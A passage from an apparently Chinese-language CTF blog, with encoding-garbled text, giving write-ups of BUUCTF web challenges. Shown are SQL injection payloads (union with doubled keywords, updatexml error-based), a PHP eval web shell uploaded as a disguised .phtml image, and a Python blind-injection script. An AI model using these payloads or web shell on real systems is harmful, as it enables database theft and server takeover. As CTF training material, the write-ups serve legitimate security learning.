<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=404 &amp;money=1e9</span><br></pre></td></tr></table></figure>

<p>ruaï¼çˆ†å‡ºäº†  <abbr title='å“¼å“¼ï¼Œæœ€åè¿˜ä¸æ˜¯æ²¡èŠ±é’±ï¼Œå˜»å˜»å˜»'><code>flag</code></abbr> ğŸ˜„</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4840bd2b-9480-4944-b36e-80df7c1a8413&#125; </span><br></pre></td></tr></table></figure>

<h2 id="Think"><a href="#Think" class="headerlink" title="Think"></a>Think</h2><p>è™½ç„¶è¿™é¢˜æ˜¯è§£å‡ºæ¥äº†ï¼Œä½†æ˜¯æœŸé—´éå¸¸éš¾å—ï¼ŒBPä¸€ç›´æœ‰é—®é¢˜æˆ‘çœŸæ˜¯æœäº†ï¼Œæœ€åè¿˜æ˜¯æ„Ÿè°¢è°­æ€»æé†’å¯ä»¥åˆ©ç”¨ hackbarï¼Œä¸ç„¶å°±ç›´æ¥çˆ†ç‚¸ ğŸŒš</p>
<p>è¿˜æœ‰ç½‘ä¸Šçœ‹åˆ°äº†åˆ«çš„å¤§ç¥çš„é¢˜è§£ï¼Œè¯´æ˜¯ money é‚£ä¸ªåœ°æ–¹â€¦â€¦å¯ä»¥å€ŸåŠ© strcmp å‡½æ•°çš„ç‰¹æ€§</p>
<p>æ­¤å¤„å‘ˆä¸Šï¼š<a target="_blank" rel="noopener" href='https://www.cnblogs.com/xhds/p/12312055.html' style='text-decoration: none'>strcmp()å‡½æ•°å®‰å…¨æ¼æ´</a></p>
<p>åœ¨ money åé¢åŠ ä¸€ä¸ª[]å˜ä¸ºmoney[]ï¼Œç›´æ¥ç»•è¿‡å–å¾— flagï¼Œæˆ‘è¿˜æ˜¯å¤ªèœäº†ğŸ˜­</p>
<h1 id="0x08-BabySQL"><a href="#0x08-BabySQL" class="headerlink" title="0x08 BabySQL"></a>0x08 BabySQL</h1><h2 id="Analysis-8"><a href="#Analysis-8" class="headerlink" title="Analysis"></a>Analysis</h2><p><strong>è€ƒå¯Ÿé¡¹ï¼š</strong> SQLæ³¨å…¥ â€” è”åˆæŸ¥è¯¢  |  è¿‡æ»¤å­—ç¬¦åŒå†™ç»•è¿‡</p>
<h2 id="WriteUp-8"><a href="#WriteUp-8" class="headerlink" title="WriteUp"></a>WriteUp</h2><p>è¿™é¢˜ä¸€å¼€å§‹æ¯«æ— è§£é¢˜æ€è·¯ï¼Œåæ¥åœ¨ç½‘ä¸Šå‚è€ƒäº†åˆ«äººçš„ WP æ‰æç„¶å¤§æ‚Ÿï¼Œä»æ­¤å¤šäº†ç§æ–°å§¿åŠ¿ğŸ˜¬</p>
<p>è¿™é¢˜æ˜¯ä¸€é“å¸¸è§„çš„åŒå†™ç»•è¿‡ï¼Œå…¶ä»–åœ°æ–¹å‡ ä¹å’Œ LoveSQL ä¸€æ¨¡ä¸€æ ·æ¬¸</p>
<p>æ‰€ä»¥å°±ç›´æ¥ä¸€æ³¢æ“ä½œï¼šå…ˆæŸ¥è¯¢åˆ—æ•°ï¼Œæ„é€  payloadï¼š <code>?username=1%27 oorrder bbyy 4 %23&password=a</code></p>
<p>å¾—åˆ°æœŸæœ›è¾“å‡ºç»“æœï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>

<p>è¯´æ˜æœ‰ä¸‰åˆ—ï¼Œç„¶åçˆ†åº“</p>
<p>æ„é€  payloadï¼š <code>?username=1%27 uniunionon selselectect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata %23&password=a</code></p>
<p>æˆåŠŸçˆ†å‡ºï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello 2ï¼</span><br><span class="line">Your password is &#x27;information_schema,test,performance_schema,mysql,geek,ctf&#x27;</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿›è¡Œçˆ†è¡¨ ğŸ˜•</p>
<p>æ„é€  payloadï¼š <code>?username=1%27 uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database() %23&password=a</code></p>
<p>æˆåŠŸçˆ†å‡ºï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello 2ï¼</span><br><span class="line">Your password is &#x27;b4bsql,geekuser&#x27;</span><br></pre></td></tr></table></figure>

<p>æœ€åçˆ†åˆ— ğŸ˜›</p>
<p>æ„é€  payloadï¼š <code>?username=1%27 uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database() %23&password=a</code></p>
<p>æˆåŠŸçˆ†å‡ºï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello 2ï¼</span><br><span class="line">Your password is &#x27;id,username,password,id,username,password&#x27;</span><br></pre></td></tr></table></figure>

<p>æœ‰äº†ä¸Šæ¬¡ LoveSQL çš„ç»éªŒï¼Œç›´æ¥è¿›å…¥ password ğŸ˜</p>
<p>æ„é€  payloadï¼š <code>?username=1%27 uniunionon selselectect 1,2,group_concat(passwoorrd) frfromom b4bsql %23&password=a</code></p>
<p>çˆ†å‡º flagï¼ğŸ˜†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6e715bbf-57b1-4270-a214-c8a5792a11b3&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x09-Upload"><a href="#0x09-Upload" class="headerlink" title="0x09 Upload"></a>0x09 Upload</h1><h2 id="Analysis-9"><a href="#Analysis-9" class="headerlink" title="Analysis"></a>Analysis</h2><p><strong>è€ƒå¯Ÿé¡¹ï¼š</strong> æ–‡ä»¶ä¸Šä¼ æ¼æ´  |  ä¸€å¥è¯æœ¨é©¬</p>
<p><strong>å‚è€ƒé¡¹ï¼š</strong> <a target="_blank" rel="noopener" href='https://www.cnblogs.com/yjxing/p/11507347.html' style='text-decoration: none'>PHPä¸€å¥è¯æœ¨é©¬å°ç»“</a>  |  <a target="_blank" rel="noopener" href='https://www.cnblogs.com/-wenli/p/9911556.html' style='text-decoration: none'>æ–‡ä»¶ä¸Šä¼ æ¼æ´ç»•è¿‡æŠ€å·§</a></p>
<h2 id="WriteUp-9"><a href="#WriteUp-9" class="headerlink" title="WriteUp"></a>WriteUp</h2><p><em><strong><s>å‰æ–¹é«˜èƒ½è¯¯å¯¼ï¼Œä½†æ˜¯æ˜¯æˆ‘çš„çœŸå®ç»å†ï¼Œæ‰€ä»¥ä¹Ÿä¸€å¹¶åˆ—å‡º</s></strong></em>   ğŸŒš</p>
<p>è¿™ä¸€é¢˜ä¸€å¼€å§‹å°±æ˜¯è¦æäº¤ä¸€ä¸ªå›¾ç‰‡ï¼Œè‡ªç„¶æ˜¯æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä¸Šä¼ æœ¨é©¬æ–‡ä»¶æ§åˆ¶æœåŠ¡å™¨ ğŸ™ƒ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hack&#x27;</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¦æ±‚æ˜¯å›¾ç‰‡ï¼Œè‡ªç„¶ä¸èƒ½ç›´æ¥ä¸Šä¼  php æ–‡ä»¶ï¼Œäºæ˜¯æƒ³åˆ°åœ¨æ§åˆ¶å°åˆ©ç”¨ <code>copy 1.jfif/b+2.php/a hack.jfifÂ </code> å°†å›¾ç‰‡ä¸æœ¨é©¬ç»“åˆï¼ˆå›¾ç‰‡æœ¨é©¬ï¼ˆæ‰‹åŠ¨æ»‘ç¨½ï¼‰ï¼‰</p>
<p>ç„¶åè¿›è¡Œä¸Šä¼ ï¼ˆè¿™é‡Œä¼¼ä¹æœ‰æ–‡ä»¶å¤§å°éªŒè¯ï¼Œæ‰€ä»¥ä¹‹å‰ä¸Šä¼ çš„ä¸€äº›éƒ½å¤±è´¥äº†ï¼Œæœ€åç”¨çš„ jfif ğŸ˜­ï¼‰ï¼Œç„¶åä¸Šä¼ æˆåŠŸï¼Œåªæ˜¯æ˜¾ç¤ºäº†è¿™ä¹ˆä¸€æ®µè¯ï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NO! HACKER! your file included &#x27;&lt;?&#x27;</span><br></pre></td></tr></table></figure>

<p>å¾ˆæ˜¾ç„¶ï¼Œç½‘ç«™ä¼šå¯¹æ–‡ä»¶è¿›è¡Œæ£€æŸ¥å¹¶ä¸”è¿‡æ»¤æ‰äº† php å¤´ ğŸ˜¡</p>
<p>ç„¶ååœ¨ç½‘ä¸Šæ‰¾äº†ä¸€äº›èµ„æ–™ï¼Œå‘ç°å¯ä»¥åˆ©ç”¨ js çš„æ–¹å¼ç»•è¿‡ï¼Œäºæ˜¯é‡æ–°å†™äº† php ä»£ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;hack&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†æ¬¡ä¸Šä¼ ï¼Œè¿™ä¸€æ¬¡ä¸Šä¼ éå¸¸æˆåŠŸï¼Œç„¶åè¿›å…¥ uploadï¼Œæ‰¾åˆ°å¹¶æ‰“å¼€ä¸Šä¼ çš„é‚£ä¸ªæ–‡ä»¶ï¼ŒæˆåŠŸæ˜¾ç¤ºï¼Œç„¶åèœåˆ€è¿æ¥ï¼Œç„¶åâ€¦â€¦â€¦â€¦ğŸŒšğŸŒšğŸŒš</p>
<p>å°±æ²¡æœ‰ç„¶åäº†ï¼Œå¾ˆæ˜¾ç„¶æˆ‘çš„æœ‰é—®é¢˜ğŸŒšï¼Œä½†æ˜¯é—®é¢˜å‡ºåœ¨å“ªé‡Œå‘¢ï¼Œåˆä¸Šç½‘æ‰¾äº†ä¸€æ³¢èµ„æ–™ï¼Œå‘ç°æˆ‘å¯»æ€ç€è¦çœŸçš„ä¸Šä¼ å›¾ç‰‡çš„æƒ³æ³•æ˜¯å¾ˆæœ‰é—®é¢˜çš„â€¦â€¦ğŸŒš</p>
<p><em><strong>å¥½äº†ï¼Œè¿™é‡Œå¼€å§‹æ­£è§£</strong></em>   ğŸŒšğŸŒš</p>
<p>æ‰“å¼€ BPï¼Œéšä¾¿ä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œæ‹¦æˆªä¸‹æ¥ï¼Œè¿›è¡Œä¿®æ”¹ï¼Œå°†åŸæ¥çš„å†…å®¹ä¿®æ”¹ä¸ºï¼š</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;hack.jpg&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;hk&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ ï¼Œå¥½å®¶ä¼™ï¼Œæ˜¾ç¤ºäº†è¿™ä¹ˆä¸€å¥è¯ï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Don&#x27;t lie to me, it&#x27;s not image at all!!!</span><br></pre></td></tr></table></figure>

<p>å¥½æ»´å§ï¼Œçœ‹æ¥éœ€è¦å°è¯•æ–‡ä»¶å¤´ç»•è¿‡ï¼Œæˆ‘ç”¨çš„æ˜¯ GIF çš„æ–‡ä»¶å¤´å¹»æ•° <code>GIF89a</code> ï¼Œç„¶åä¸çŸ¥é“ä¸ºå•¥ JPG çš„è¡Œä¸é€šå—·</p>
<p>å†æ¬¡ä¸Šä¼ ï¼ŒæˆåŠŸï¼Œç„¶åæŸ¥çœ‹ upload å‘ç° phtml æ˜¯æ²¡æœ‰è¿‡æ»¤æ»´ï¼Œæ‰€ä»¥æœ€åçš„å†…å®¹ä¿®æ”¹ä¸ºï¼š</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;hack.phtml&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;hk&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ ï¼Œç„¶åæ‰“å¼€èœåˆ€è¿æ¥ï¼Œæ–‡ä»¶å¤ªå¤šä¸å¥½æ‰¾ï¼Œç›´æ¥åœ¨ç»ˆç«¯è¾“å…¥ <code>cat /flag</code></p>
<p>è·å¾— flag ğŸ™‚ğŸ™‚ğŸ™‚</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;62921b55-5522-4235-aa02-7473a34e7b40&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x010-HardSQL"><a href="#0x010-HardSQL" class="headerlink" title="0x010 HardSQL"></a>0x010 HardSQL</h1><h2 id="Analysis-10"><a href="#Analysis-10" class="headerlink" title="Analysis"></a>Analysis</h2><p><strong>è€ƒå¯Ÿé¡¹ï¼š</strong> SQLæ³¨å…¥ â€” æŠ¥é”™æ³¨å…¥</p>
<p><strong>å‚è€ƒé¡¹ï¼š</strong> <a target="_blank" rel="noopener" href='https://cloud.tencent.com/developer/news/365506' style='text-decoration: none'>åŸºäº updatexml çš„æŠ¥é”™æ³¨å…¥</a></p>
<h2 id="WriteUp-10"><a href="#WriteUp-10" class="headerlink" title="WriteUp"></a>WriteUp</h2><p>è¿™é¢˜ä¸€å¼€å§‹å†²ä¸Šæ¥ç›´æ¥ä¸€é¡¿ unionã€selectâ€¦â€¦ç„¶åè¢«ä½œè€…å˜²è®½ï¼š <code style='color: red'>ä½ å¯åˆ«è¢«æˆ‘é€®ä½äº†ï¼Œè‡­å¼Ÿå¼Ÿ</code> ğŸŒš</p>
<p>å°±TMç¦»è°±æ˜¯ä¸æ˜¯ï¼Œåæ¥æ€è€ƒä¸€ä¸‹è¿™é¢˜å¤§æ¦‚æ˜¯æŠŠç©ºæ ¼è¿‡æ»¤äº†ï¼Œç”¨æˆ·åè¯•äº†è¯• <code>' #</code> è¯æ˜äº†ç©ºæ ¼è¢«è¿‡æ»¤çš„äº‹å®</p>
<p>ä½†æ˜¯é—®é¢˜å°±æ¥äº†ï¼Œæˆ‘çŸ¥é“è¿™ä¸€ç‚¹ç‚¹ä¹Ÿæ²¡ç”¨ï¼Œæˆ‘å½“æ—¶å¹¶ä¸çŸ¥é“è¯¥å¦‚ä½•æ˜¯å¥½ï¼Œæ„Ÿè°¢<abbr title='ğŸ‹ç‰›é€¼ï¼'>æŸ æª¬ğŸ‹å¸ˆå‚…</abbr>çš„æç¤ºï¼Œæˆ‘å»æ‰¾äº†æŠ¥é”™æ³¨å…¥çš„ç›¸å…³èµ„æ–™å­¦ä¹ ï¼Œæœ€åä½¿ç”¨ updatexml æŠ¥é”™æ³•æ³¨å…¥</p>
<p>å¯¹äº†ï¼Œç”±äºç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ‹¬å·æ¥ä»£æ›¿ä¹‹</p>
<p>ç°çˆ†åº“</p>
<p>æ„é€  payload ï¼š <code>?username=1%27or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&password=a</code> </p>
<p>é¡µé¢çˆ†å‡ºé”™è¯¯ä¿¡æ¯ï¼šï¼ˆä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦æŸ¥è¯¢çš„ç»“æœï¼‰ğŸ‘</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~geek~&#x27;</span><br></pre></td></tr></table></figure>

<p>å†çˆ†è¡¨</p>
<p>æ„é€  payloadï¼š <code>?username=1%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&password=a</code></p>
<p>çˆ†å‡ºé”™è¯¯ä¿¡æ¯ / æŸ¥è¯¢ç»“æœï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~H4rDsq1~&#x27;</span><br></pre></td></tr></table></figure>

<p>ç„¶åæŸ¥å­—æ®µ</p>
<p>æ„é€  payloadï¼š <code>?username=1%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e),1))%23&password=a</code></p>
<p>çˆ†å‡ºé”™è¯¯ä¿¡æ¯ / æŸ¥è¯¢ç»“æœï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~id,username,password~&#x27;</span><br></pre></td></tr></table></figure>

<p>æœ€åæŸ¥æ°´è¡¨â€¦â€¦ä¸æ˜¯ï¼Œå’³å’³ï¼ŒæŸ¥æ•°æ® ğŸ˜</p>
<p>æ„é€  payloadï¼š <code>?username=1%27or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))%23&password=a</code></p>
<p>ç„¶å ruaï¼çˆ†å‡º flag ğŸ˜œ</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~flag&#123;485496cb-a452-47f8-bc1f-02&#x27;</span><br></pre></td></tr></table></figure>

<p>ç­‰â€¦â€¦ç­‰ä¸‹ï¼ŒSurprise mother fuckerï¼Ÿå’‹åªæœ‰ä¸€åŠï¼ŸğŸ˜±</p>
<p>çœ‹æ¥è¿˜æœ‰åŠæˆªåœ¨åé¢ï¼Œæ²¡æœ‰çˆ†å‡ºæ¥ï¼Œæ‰€ä»¥ç”¨ right æŠŠ password åé¢çš„çˆ†å‡ºæ¥ï¼Œå†æ¬¡æ„é€  payload</p>
<p>æœ€åçš„ payloadï¼š <code>?username=1%27or(updatexml(1,concat(0x7e,(select(group_concat(right(password,20)))from(H4rDsq1)),0x7e),1))%23&password=a</code></p>
<p>ç»ˆäºæ˜¯çˆ†å‡ºäº†æœ€ååŠæˆª flag</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~8-bc1f-02da2fb264fd&#125;~&#x27;</span><br></pre></td></tr></table></figure>

<p>æœ€åæ‹¼èµ·æ¥ï¼Œå°±å¾—åˆ° flag å•¦~~~ ğŸ˜„</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;485496cb-a452-47f8-bc1f-02da2fb264fd&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x011-FinalSQL"><a href="#0x011-FinalSQL" class="headerlink" title="0x011 FinalSQL"></a>0x011 FinalSQL</h1><p>è›‹ç–¼çš„ç›²æ³¨ï¼ˆå»ºè®®å†™äºŒåˆ†è·‘ï¼‰</p>
<p>è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿”å›å­—æ®µ</span></span><br><span class="line">S = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment"># çˆ†åº“</span></span><br><span class="line">url_1 = <span class="string">&quot;http://191b65c7-05c5-4432-b77f-56d04b65f942.node3.buuoj.cn/search.php?id=1=(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;times&#125;,1))=&#123;num&#125;)=1&quot;</span></span><br><span class="line"><span class="comment"># çˆ†è¡¨</span></span><br><span class="line">url_2 = <span class="string">&quot;http://191b65c7-05c5-4432-b77f-56d04b65f942.node3.buuoj.cn/search.php?id=1=(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;times&#125;,1))=&#123;num&#125;)=1&quot;</span></span><br><span class="line"><span class="comment"># çˆ†åˆ—</span></span><br><span class="line">url_3 = <span class="string">&quot;http://191b65c7-05c5-4432-b77f-56d04b65f942.node3.buuoj.cn/search.php?id=1=(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;Flaaaaag&#x27;)),&#123;times&#125;,1))=&#123;num&#125;)=1&quot;</span></span><br><span class="line"><span class="comment"># çˆ†å­—æ®µä¿¡æ¯</span></span><br><span class="line">url_4 = <span class="string">&quot;http://191b65c7-05c5-4432-b77f-56d04b65f942.node3.buuoj.cn/search.php?id=1=(ascii(substr((select(group_concat(fl4gawsl))from(Flaaaaag)),&#123;times&#125;,1))=&#123;num&#125;)=1&quot;</span></span><br><span class="line"><span class="comment"># å‘ç°å°¼ç›æ˜¯å‡ flag è¡¨</span></span><br><span class="line"><span class="comment"># é‡æ–°çˆ†åˆ—</span></span><br><span class="line">url_5 = <span class="string">&quot;http://191b65c7-05c5-4432-b77f-56d04b65f942.node3.buuoj.cn/search.php?id=1=(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;times&#125;,1))=&#123;num&#125;)=1&quot;</span></span><br><span class="line"><span class="comment"># é‡æ–°çˆ†å­—æ®µä¿¡æ¯ï¼ˆcnmdï¼‰</span></span><br><span class="line">url_6 = <span class="string">&quot;http://191b65c7-05c5-4432-b77f-56d04b65f942.node3.buuoj.cn/search.php?id=1=(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;times&#125;,1))=&#123;num&#125;)=1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nums</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">nums = [n for n in range(ord(&#x27;a&#x27;), ord(&#x27;z&#x27;) + 1)]</span></span><br><span class="line"><span class="string">nums.insert(0, ord(&#x27;,&#x27;))</span></span><br><span class="line"><span class="string">nums.insert(0, ord(&#x27;_&#x27;))</span></span><br><span class="line"><span class="string">nums.insert(0, ord(&#x27;:&#x27;))</span></span><br><span class="line"><span class="string">nums.insert(0, ord(&#x27;/&#x27;))</span></span><br><span class="line"><span class="string">nums.insert(0, ord(&#x27;.&#x27;))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(10):</span></span><br><span class="line"><span class="string">    nums.insert(0, ord(str(i)))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(ord(&#x27;A&#x27;), ord(&#x27;z&#x27;) + 1):</span></span><br><span class="line"><span class="string">    nums.insert(0, i)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">nums = <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">128</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> times <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">500</span>):</span><br><span class="line">    k = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">        content = requests.get(url_6.<span class="built_in">format</span>(times=times, num=num)).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Click&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">            k = <span class="literal">False</span></span><br><span class="line">            S += <span class="built_in">chr</span>(num)</span><br><span class="line">            <span class="built_in">print</span>(S)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> k <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;END!!!!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(S)</span><br></pre></td></tr></table></figure>


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-EasySQL"><span class="toc-number">1.</span> <span class="toc-text">0x00  EasySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteUp"><span class="toc-number">1.2.</span> <span class="toc-text">WriteUp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-Havefun"><span class="toc-number">2.</span> <span class="toc-text">0x01 Havefun</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-1"><span class="toc-number">2.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteUp-1"><span class="toc-number">2.2.</span> <span class="toc-text">WriteUp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-PHP"><span class="toc-number">3.</span> <span class="toc-text">0x02 PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-2"><span class="toc-number">3.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteUp-2"><span class="toc-number">3.2.</span> <span class="toc-text">WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#index-php"><span class="toc-number">3.2.0.0.1.</span> <span class="toc-text">index.php</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#class-php"><span class="toc-number">3.2.0.0.2.</span> <span class="toc-text">class.php</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#flag-php"><span class="toc-number">3.2.0.0.3.</span> <span class="toc-text">flag.php</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-Secret-File"><span class="toc-number">4.</span> <span class="toc-text">0x03 Secret File</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-3"><span class="toc-number">4.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteUp-3"><span class="toc-number">4.2.</span> <span class="toc-text">WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%EF%BC%9A"><span class="toc-number">4.2.0.0.1.</span> <span class="toc-text">è¯·æ±‚ï¼š</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%93%8D%E5%BA%94%EF%BC%9A"><span class="toc-number">4.2.0.0.2.</span> <span class="toc-text">å“åº”ï¼š</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-Knife"><span class="toc-number">5.</span> <span class="toc-text">0x04 Knife</span></a><ol 